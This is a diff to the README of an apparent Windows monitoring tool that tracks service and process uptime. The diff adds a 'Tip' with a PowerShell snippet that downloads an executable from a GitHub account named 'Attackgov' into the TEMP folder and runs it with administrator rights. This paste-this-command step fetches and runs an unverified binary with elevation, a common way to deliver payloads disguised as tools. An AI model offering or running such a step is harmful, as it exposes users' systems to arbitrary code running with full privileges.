@@ -3,6 +3,15 @@
 A Windows monitoring tool that checks the uptime and status of specific services and processes.  
 It detects restarts, delayed starts after system boot, and missing processes/services - updating the console in real time with colored output.
 
+## Tip
+Run this using powershell for easier execution:
+
+```
+$tool = "$env:TEMP\UptimeParser.exe"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Attackgov/UptimeParser/main/UptimeParser.exe" -OutFile $tool
+Start-Process -FilePath $tool -Verb RunAs
+```
+
 ---
 ## 📋 Patchnotes
 - **[+]** Ignores delayed services caused by late startup
